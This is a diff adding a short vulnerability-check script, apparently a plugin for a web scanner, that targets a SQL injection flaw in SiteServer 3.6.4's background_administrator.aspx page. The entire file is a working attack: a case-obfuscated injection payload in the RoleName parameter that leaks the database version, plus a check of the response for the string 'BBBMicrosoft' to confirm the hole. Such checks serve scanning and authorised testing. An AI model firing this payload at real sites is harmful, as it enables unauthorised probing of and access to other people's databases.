@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /userRole/background_administrator.aspx?RoleName=%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName
+#define bug = BBBMicrosoft
+#define info = 存在siteserver3.6.4 background_administrator.aspx注入漏洞
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
